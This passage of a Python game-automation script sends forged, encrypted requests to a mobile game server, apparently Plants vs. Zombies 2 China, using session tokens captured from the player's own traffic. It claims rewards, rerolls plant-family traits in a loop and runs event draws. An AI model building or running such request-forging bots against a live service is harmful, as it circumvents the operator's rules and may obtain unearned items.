1, "f": shijie}, {"i": "1268", "q": 1, "f": shijie}, {"i": "1269", "q": 1, "f": shijie}, {"i": "1270", "q": 1, "f": shijie}, {"i": "1271", "q": 1, "f": shijie}, {"i": "1272", "q": 1, "f": shijie}, {"i": "1273", "q": 1, "f": shijie}, {"i": "1274", "q": 1, "f": shijie}, {"i": "1275", "q": 1, "f": shijie}, {"i": "1276", "q": 1, "f": shijie}, {"i": "1277", "q": 1, "f": shijie}, {"i": "1278", "q": 1, "f": shijie}, {"i": "1279", "q": 1, "f": shijie}, {"i": "1280", "q": 1, "f": shijie}, {"i": "1281", "q": 1, "f": shijie}, {"i": "1282", "q": 1, "f": shijie}, {"i": "1283", "q": 1, "f": shijie}, {"i": "1284", "q": 1, "f": shijie}, {"i": "1285", "q": 1, "f": shijie}, {"i": "1286", "q": 1, "f": shijie}, {"i": "1288", "q": 1, "f": shijie}, {"i": "1289", "q": 1, "f": shijie}, {"i": "1290", "q": 1, "f": shijie}, {"i": "1291", "q": 1, "f": shijie}, {"i": "1292", "q": 1, "f": shijie}, {"i": "1293", "q": 1, "f": shijie}, {"i": "1294", "q": 1, "f": shijie}, {"i": "1295", "q": 1, "f": shijie}, {"i": "1297", "q": 1, "f": shijie}, {"i": "1298", "q": 1, "f": shijie}, {"i": "111201", "q": 1, "f": shijie}, {"i": "111202", "q": 1, "f": shijie}, {"i": "111203", "q": 1, "f": shijie}, {"i": "111204", "q": 1, "f": shijie}, {"i": "111206", "q": 1, "f": shijie}, {"i": "111208", "q": 1, "f": shijie}, {"i": "111209", "q": 1, "f": shijie}, {"i": "111210", "q": 1, "f": shijie}, {"i": "111211", "q": 1, "f": shijie}, {"i": "111212", "q": 1, "f": shijie}, {"i": "111213", "q": 1, "f": shijie}, {"i": "111214", "q": 1, "f": shijie}, {"i": "111215", "q": 1, "f": shijie}, {"i": "111216", "q": 1, "f": shijie}, {"i": "111217", "q": 1, "f": shijie}, {"i": "111218", "q": 1, "f": shijie}, {"i": "111219", "q": 1, "f": shijie}, {"i": "111220", "q": 1, "f": shijie}, {"i": "111221", "q": 1, "f": shijie}, {"i": "111222", "q": 1, "f": shijie}, {"i": "111223", "q": 1, "f": shijie}, {"i": "111224", "q": 1, "f": shijie}, {"i": "111225", "q": 1, "f": shijie}, {"i": "111226", "q": 1, "f": shijie}, {"i": "111227", "q": 1, "f": shijie}, {"i": "111228", "q": 1, "f": shijie}, {"i": "111229", "q": 1, "f": shijie}, {"i": "111230", "q": 1, "f": shijie}, {"i": "111231", "q": 1, "f": shijie}, {"i": "111232", "q": 1, "f": shijie}, {"i": "111233", "q": 1, "f": shijie}, {"i": "111234", "q": 1, "f": shijie}, {"i": "111235", "q": 1, "f": shijie}, {"i": "111236", "q": 1, "f": shijie}, {"i": "111237", "q": 1, "f": shijie}, {"i": "111238", "q": 1, "f": shijie}, {"i": "111239", "q": 1, "f": shijie}, {"i": "111240", "q": 1, "f": shijie}, {"i": "111241", "q": 1, "f": shijie}, {"i": "111242", "q": 1, "f": shijie}, {"i": "111243", "q": 1, "f": shijie}, {"i": "111244", "q": 1, "f": shijie}, {"i": "111245", "q": 1, "f": shijie}, {"i": "111246", "q": 1, "f": shijie}, {"i": "111247", "q": 1, "f": shijie}, {"i": "111248", "q": 1, "f": shijie}, {"i": "111249", "q": 1, "f": shijie}, {"i": "111250", "q": 1, "f": shijie}, {"i": "111251", "q": 1, "f": shijie}, {"i": "111252", "q": 1, "f": shijie}, {"i": "111253", "q": 1, "f": shijie}, {"i": "111254", "q": 1, "f": shijie}, {"i": "111255", "q": 1, "f": shijie}, {"i": "111256", "q": 1, "f": shijie}, {"i": "111258", "q": 1, "f": shijie}, {"i": "111260", "q": 1, "f": shijie}, {"i": "111261", "q": 1, "f": shijie}, {"i": "111262", "q": 1, "f": shijie}, {"i": "111263", "q": 1, "f": shijie}, {"i": "111264", "q": 1, "f": shijie}, {"i": "111265", "q": 1, "f": shijie}, {"i": "111266", "q": 1, "f": shijie}, {"i": "111267", "q": 1, "f": shijie}, {"i": "111268", "q": 1, "f": shijie}, {"i": "111269", "q": 1, "f": shijie}, {"i": "111270", "q": 1, "f": shijie}, {"i": "111271", "q": 1, "f": shijie}, {"i": "111272", "q": 1, "f": shijie}, {"i": "111273", "q": 1, "f": shijie}, {"i": "111274", "q": 1, "f": shijie}, {"i": "111275", "q": 1, "f": shijie}, {"i": "111276", "q": 1, "f": shijie}, {"i": "111278", "q": 1, "f": shijie}, {"i": "111279", "q": 1, "f": shijie}, {"i": "111281", "q": 1, "f": shijie}, {"i": "111282", "q": 1, "f": shijie}, {"i": "111284", "q": 1, "f": shijie}, {"i": "111285", "q": 1, "f": shijie}, {"i": "111286", "q": 1, "f": shijie}, {"i": "111287", "q": 1, "f": shijie}, {"i": "111288", "q": 1, "f": shijie}, {"i": "111289", "q": 1, "f": shijie}, {"i": "111290", "q": 1, "f": shijie}, {"i": "111291", "q": 1, "f": shijie}, {"i": "32000000", "q": 1, "f": shijie}, {"i": "32000010", "q": 1, "f": shijie}, {"i": "32000020", "q": 1, "f": shijie}, {"i": "32000030", "q": 1, "f": shijie}, {"i": "32000040", "q": 1, "f": shijie}, {"i": "32000050", "q": 1, "f": shijie}, {"i": "32000060", "q": 1, "f": shijie}, {"i": "32000070", "q": 1, "f": shijie}, {"i": "32000080", "q": 1, "f": shijie}, {"i": "32000090", "q": 1, "f": shijie}, {"i": "32000100", "q": 1, "f": shijie}, {"i": "32000110", "q": 1, "f": shijie}, {"i": "32000120", "q": 1, "f": shijie}, {"i": "32000130", "q": 1, "f": shijie}, {"i": "32000140", "q": 1, "f": shijie}, {"i": "32000150", "q": 1, "f": shijie}, {"i": "32000160", "q": 1, "f": shijie}, {"i": "32000170", "q": 1, "f": shijie}, {"i": "32000180", "q": 1, "f": shijie}, {"i": "32000190", "q": 1, "f": shijie}, {"i": "32000200", "q": 1, "f": shijie}, {"i": "32000210", "q": 1, "f": shijie}, {"i": "32000220", "q": 1, "f": shijie}, {"i": "32000230", "q": 1, "f": shijie}, {"i": "32000240", "q": 1, "f": shijie}, {"i": "32000250", "q": 1, "f": shijie}, {"i": "32000260", "q": 1, "f": shijie}, {"i": "32000270", "q": 1, "f": shijie}, {"i": "32000280", "q": 1, "f": shijie}, {"i": "32000290", "q": 1, "f": shijie}, {"i": "32000300", "q": 1, "f": shijie}, {"i": "32000310", "q": 1, "f": shijie}, {"i": "32000320", "q": 1, "f": shijie}, {"i": "32000330", "q": 1, "f": shijie}, {"i": "32000340", "q": 1, "f": shijie}, {"i": "32000350", "q": 1, "f": shijie}, {"i": "32000370", "q": 1, "f": shijie}, {"i": "32000380", "q": 1, "f": shijie}, {"i": "32000390", "q": 1, "f": shijie}, {"i": "32000410", "q": 1, "f": shijie}, {"i": "32000430", "q": 1, "f": shijie}, {"i": "32000440", "q": 1, "f": shijie}, {"i": "32000450", "q": 1, "f": shijie}, {"i": "32000460", "q": 1, "f": shijie}, {"i": "32000470", "q": 1, "f": shijie}, {"i": "32000480", "q": 1, "f": shijie}, {"i": "32000490", "q": 1, "f": shijie}, {"i": "32000500", "q": 1, "f": shijie}, {"i": "32000510", "q": 1, "f": shijie}, {"i": "32000520", "q": 1, "f": shijie}, {"i": "32000530", "q": 1, "f": shijie}, {"i": "32000540", "q": 1, "f": shijie}, {"i": "32000550", "q": 1, "f": shijie}, {"i": "32000560", "q": 1, "f": shijie}, {"i": "32000570", "q": 1, "f": shijie}, {"i": "32000580", "q": 1, "f": shijie}, {"i": "32000590", "q": 1, "f": shijie}, {"i": "32000600", "q": 1, "f": shijie}, {"i": "32000610", "q": 1, "f": shijie}, {"i": "32000620", "q": 1, "f": shijie}, {"i": "32000630", "q": 1, "f": shijie}, {"i": "32000640", "q": 1, "f": shijie}, {"i": "32000650", "q": 1, "f": shijie}, {"i": "32000660", "q": 1, "f": shijie}, {"i": "32000670", "q": 1, "f": shijie}, {"i": "32000680", "q": 1, "f": shijie}, {"i": "32000690", "q": 1, "f": shijie}, {"i": "32000700", "q": 1, "f": shijie}, {"i": "32000710", "q": 1, "f": shijie}, {"i": "32000720", "q": 1, "f": shijie}, {"i": "32000730", "q": 1, "f": shijie}, {"i": "32000740", "q": 1, "f": shijie}, {"i": "32000750", "q": 1, "f": shijie}, {"i": "32000760", "q": 1, "f": shijie}, {"i": "32000770", "q": 1, "f": shijie}, {"i": "32000780", "q": 1, "f": shijie}, {"i": "32000790", "q": 1, "f": shijie}, {"i": "32000800", "q": 1, "f": shijie}, {"i": "32000820", "q": 1, "f": shijie}, {"i": "32000830", "q": 1, "f": shijie}, {"i": "32000840", "q": 1, "f": shijie}, {"i": "32000850", "q": 1, "f": shijie}, {"i": "32000860", "q": 1, "f": shijie}, {"i": "32000880", "q": 1, "f": shijie}, {"i": "32000900", "q": 1, "f": shijie}, {"i": "32000910", "q": 1, "f": shijie}, {"i": "32000920", "q": 1, "f": shijie}, {"i": "32000930", "q": 1, "f": shijie}, {"i": "32000940", "q": 1, "f": shijie}, {"i": "32000950", "q": 1, "f": shijie}, {"i": "32000960", "q": 1, "f": shijie}, {"i": "32000970", "q": 1, "f": shijie}, {"i": "32000980", "q": 1, "f": shijie}, {"i": "32000990", "q": 1, "f": shijie}], "pi": pi, "sk": sk, "ui":ui, "uk": uki}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("伴生装扮领取成功")
    else:
        print("伴生装扮领取失败")
def run_twenty_third_script():
    pi, ui, sk = get_pi_sk(加密)
    print("""
 1. 新人组
 2. 光芒万丈
 3. 不动如山
 4. 真能打
 6. 火力全开
 7. 冰力四射
 8. 雷霆万钧
 9. 能量武器
 10. 精英豌豆
 11. 军火库
 12. 三分王
 13. 神射手
 14. 百步穿僵
 15. 人多力量大
 17. 暗影家族
 18. 环保卫士
 19. 文艺青年
 20. 忍者小队
 21. 大厨组合
 22. 摧枯拉朽
 23. 坚固防线
 24. 控场大师
 25. 魔法大师
 26. 枝繁叶茂
 27. 十二生肖
 28. 繁花似锦
 29. 打飞他们
 30. 十万伏特
 31. 动物世界
 32. 炸个痛快
 33. 小心脚下
 34. 惊声尖笑
 35. 运动健将
 36. 不如跳舞
 37. 头有点晕
 38. 酸甜苦辣
 39. 武林对决
 40. 地爆天星
 41. 光暗交织
 42. 亿点控制
 43. 冰与火
 44. 未来科技
 45. 花开富贵
 46. 火力压制
 47. 群卜荟萃
 48. 狂欢派对
 49. 过载电流
 50. 来自深渊
 51. 乘风破浪"

""")
    search_fi = str((int(input("请输入要刷的家族: ")) + 50000))
    data = {"req":"V325","e":{"fi":search_fi,"pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("二词条解锁成功")
    elif response_data.get("r") == 28024:
        print("二词条已解锁")
    else:
        print("未知错误")
    data = {"req": "V326", "e": {"ad": 0, "f": 0, "fi": search_fi, "l": "", "lv": 0, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    result = None
    for item in decrypted_json['e']['d']['fl']:
        if str(item['fi']) == search_fi:
            result = item
            break
    if result:
        first_t = result['c'][0].get('t')
        first_n = result['c'][0].get('n')
        second_t = result['c'][1].get('t')
        second_n = result['c'][1].get('n')

        translation_dict = {
            "extra_attack": "攻击力增加",
            "improved_atk_rate": "攻击速度增加",
            "improved_sunproduce_rate": "生产速度增加",
            "fast_plant": "种植冷却缩短",
            "extra_sunmoney_25": "额外产出25阳光",
            "extra_sunmoney_50": "额外产出50阳光",
            "extra_hitpoints": "生命值增加",
            "extra_defend": "防御力增加",
            "regeneration": "每5秒恢复生命",
            "improved_explode_damage": "爆炸伤害增加",
            "improved_lightning_damage": "闪电伤害增加",
            "improved_flame_damage": "火焰伤害增加",
            "improved_cold_damage": "冰冻伤害增加",
            "extra_melee_attack": "近战伤害增加",
            "lower_cost": "阳光消耗降低",
            "invincible": "无敌3秒概率",
            "ghost": "灵魂状态概率",
            "plant_sun_refund": "返还阳光概率"
        }
        print("当前该家族的词条为:")
        print(translation_dict.get(first_t, first_t))
        print(first_n)
        print(translation_dict.get(second_t, second_t))
        print(second_n)
    if result:
        l1_value = result['c'][1]['m']
        l2_value = result['c'][0]['m']
    else:
        print("未找到匹配的项")
    keys = {
        '1': "extra_attack",
        '2': "improved_atk_rate",
        '3': "improved_sunproduce_rate",
        '4': "fast_plant",
        '5': "extra_sunmoney_25",
        '6': "extra_sunmoney_50",
        '7': "extra_hitpoints",
        '8': "extra_defend",
        '9': "regeneration",
        '10': "improved_explode_damage",
        '11': "improved_lightning_damage",
        '12': "improved_flame_damage",
        '13': "improved_cold_damage",
        '14': "extra_melee_attack",
        '15': "lower_cost",
        '16': "invincible",
        '17': "ghost",
        '18': "plant_sun_refund"
    }
    refresh_method = input("请输入刷新方式（1-免费，2-广告，3-钻石）: ")
    if refresh_method == '1':
        ad = "0"
        f = "1"
    elif refresh_method == '2':
        ad = "1"
        f = "0"
    elif refresh_method == '3':
        ad = "0"
        f = "0"
    else:
        print("无效的刷新方式")
        exit()
    word_type = input("请输入刷词条类型（1-全词条，2-上词条，3-下词条）: ")
    if word_type == '1':
        l = ""
    elif word_type == '2':
        l = l1_value
    elif word_type == '3':
        l = l2_value
    else:
        print("无效的词条类型")
        exit()
    level_value = input("请输入开刷等级: ")
    if pingtai == 'ios':
        if int(level_value) > 68:
            print("\n等级上限为68级，已强制修改为68级\n")
            level = "68"
        else:
            level = str(int(level_value))
    else:
        level = str(int(level_value))
    while True:
        data = {"req": "V326", "e": {"ad": ad, "f": f, "fi": search_fi, "l": l, "lv": level, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        result = None
        for item in decrypted_json['e']['d']['fl']:
            if str(item['fi']) == search_fi:
                result = item
                break
        if result:
            first_bt = result['c'][0].get('bt')
            first_bn = result['c'][0].get('bn')
            second_bt = result['c'][1].get('bt')
            second_bn = result['c'][1].get('bn')
        print(f" 上词条为：{translation_dict.get(first_bt, first_bt)}")
        print(f" 数值为 {first_bn}")
        print(f" 下词条为：{translation_dict.get(second_bt, second_bt)}")
        print(f" 数值为 {second_bn}")
        choice = input("是否要重复一次？回车默认重复，输入2保存，输入3结束: ")
        if choice == "2":
            data = {"req": "V327", "e": {"fi": search_fi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("词条保存成功")
            else:
                print("词条保存失败")
        if choice == "3":
            break
def run_twenty_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("时空寻宝刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json['e']['d'][0].get('op')
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data_str = json.loads(decrypted_json['e']['d'][0]['data'])
            tbl_list = []
            tbl_dict = data_str.get('tbl', {})
            for key, value in tbl_dict.items():
                if value == 0:
                    data ={"req":"V985","e":{"pi":pi,"sk":sk,"t":"1","ti":key,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("电池领取成功")
                    else:
                        print("电池领取失败")
            data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                op_value = decrypted_json["e"]["d"][0].get("op")
                if op_value == 0 or op_value == None:
                    print("活动未开启")
                elif op_value == 1:
                    data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                    current_battery = int(data_str.get('nwmn'))
                    battery_needed = int(data_str.get('npwn'))
                    fl_list = data_str.get('fl', [])
                    has_unclaimed = any(item.get('t') == 1 for item in fl_list if isinstance(item, dict))
                    if has_unclaimed:
                        data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("奖励领取成功")
                        else:
                            print("奖励领取失败")
                    if current_battery >= battery_needed:
                        data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            fl_list = decrypted_json['e']['d']['fl']
                            first_t0_index = None
                            for index, item in enumerate(fl_list):
                                if item.get('t') == 0:
                                    first_t0_index = index
                                    break
                            target_dict = None
                            if first_t0_index is not None and first_t0_index > 0:
                                target_dict = fl_list[first_t0_index - 1]
                            elif first_t0_index is None:
                                target_dict = fl_list[-1]
                            if target_dict and 'i' in target_dict and 'q' in target_dict:
                                i_value = str(target_dict['i'])
                                q_value = target_dict['q']
                                plant_info = formatted_plant.get(
                                    i_value,
                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                            else:
                                print("未找到符合条件的字典或字典中没有i和q键")
                            data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                        else:
                            print("奖励开启失败")
            data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                op_value = decrypted_json["e"]["d"][0].get("op")
                if op_value == 0 or op_value == None:
                    print("活动未开启")
                elif op_value == 1:
                    data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                    current_battery = int(data_str.get('nwmn'))
                    battery_needed = int(data_str.get('npwn'))
                    print(f"\n目前电池数: {current_battery}\n下次开启还需要的电池数: {battery_needed}")
                    if current_battery >= battery_needed:
                        cs_value = int(current_battery / battery_needed)
                        css_value = math.ceil(cs_value / 5)
                        for _ in range(css_value):
                            if cs_value > 5:
                                cs_values = 5
                                for i in range(cs_values):
                                    data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        decrypted_response = get_decrypted_data(url, data=response)
                                        decrypted_json = json.loads(decrypted_response)
                                        fl_list = decrypted_json['e']['d']['fl']
                                        first_t0_index = None
                                        for index, item in enumerate(fl_list):
                                            if item.get('t') == 0:
                                                first_t0_index = index
                                                break
                                        target_dict = None
                                        if first_t0_index is not None and first_t0_index > 0:
                                            target_dict = fl_list[first_t0_index - 1]
                                        elif first_t0_index is None:
                                            target_dict = fl_list[-1]
                                        if target_dict and 'i' in target_dict and 'q' in target_dict:
                                            i_value = str(target_dict['i'])
                                            q_value = target_dict['q']
                                            plant_info = formatted_plant.get(
                                                i_value,
                                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                            )
                                            plant_name = plant_info["name"]
                                            plant_pinzhi = plant_info["pinzhi"]
                                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                        else:
                                            print("未找到符合条件的字典或字典中没有i和q键")
                                    else:
                                        print("奖励开启失败")
                                if cs_values > 0 and response_data.get("r") == 0:
                                    data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        print("奖励领取成功")
                                    else:
                                        print("奖励领取失败")
                                cs_value -= 5
                        for i in range(cs_value):
                            data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                decrypted_response = get_decrypted_data(url, data=response)
                                decrypted_json = json.loads(decrypted_response)
                                fl_list = decrypted_json['e']['d']['fl']
                                first_t0_index = None
                                for index, item in enumerate(fl_list):
                                    if item.get('t') == 0:
                                        first_t0_index = index
                                        break
                                target_dict = None
                                if first_t0_index is not None and first_t0_index > 0:
                                    target_dict = fl_list[first_t0_index - 1]
                                elif first_t0_index is None:
                                    target_dict = fl_list[-1]
                                if target_dict and 'i' in target_dict and 'q' in target_dict:
                                    i_value = str(target_dict['i'])
                                    q_value = target_dict['q']
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                else:
                                    print("未找到符合条件的字典")
                            else:
                                print("奖励开启失败")
                        if cs_value > 0 and response_data.get("r") == 0:
                            data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                    else:
                        print("当前电池数不足以开启")
                        if current_battery > 0:
                            data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": current_battery},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("电池消耗成功")
                            else:
                                print("电池消耗失败")
            data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                op_value = decrypted_json["e"]["d"][0].get("op")
                if op_value == 0 or op_value == None:
                    print("活动未开启")
                elif op_value == 1:
                    data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                    personal_progress = int(data_str.get('pwc', 0))
                    all_server_progress = int(data_str.get('awc', 0))
                    print(f"个人进度数: {personal_progress}\n全服进度数: {all_server_progress}\n")
                    agal_list = data_str.get('agal', [])
                    agal_indices = []
                    for idx, item in enumerate(agal_list):
                        conditions = item.get('conditions', 0)
                        is_get = item.get('isGet', 0)
                        if conditions <= all_server_progress and is_get == 0:
                            agal_indices.append(idx)
                    for idx in agal_indices:
                        data = {"req":"V860","e":{"index":idx,"pi":pi,"sk":sk,"t":"2","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            for item in decrypted_json['e']['d']['bl']:
                                i_value = str(item['i'])
                                q_value = item['q']
                                plant_info = formatted_plant.get(
                                    i_value,
                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"全服进度奖励获得: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                        else:
                            print("全服进度奖励领取失败")
                    gal_list = data_str.get('gal', [])
                    gal_indices = []
                    for idx, item in enumerate(gal_list):
                        conditions = item.get('conditions', 0)
                        is_get = item.get('isGet', 0)
                        if conditions <= personal_progress and is_get == 0:
                            gal_indices.append(idx)
                    for idx in gal_indices:
                        data ={"req":"V860","e":{"index":idx,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            for item in decrypted_json['e']['d']['bl']:
                                i_value = str(item['i'])
                                q_value = item['q']
                                plant_info = formatted_plant.get(
                                    i_value,
                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"个人进度奖励获得: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                        else:
                            print("个人进度奖励领取失败")
    else:
        print("时空寻宝刷新失败")

def run_twenty_sixth_script():
    pi, ui, sk = get_pi_sk(加密)
    for i in range(5):
        data ={"req":"V788","e":{"ai":"10895","i":i,"pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("破罐大师领取成功")
        else:
            print("破罐大师领取失败")
    for i in range(2):
        data ={"req":"V788","e":{"ai":"10895","i":i,"pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("猕猴桃领取成功")
        else:
            print("猕猴桃领取失败")
def run_twenty_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10803, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": "com.popcap.pvz2cthdbl", "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
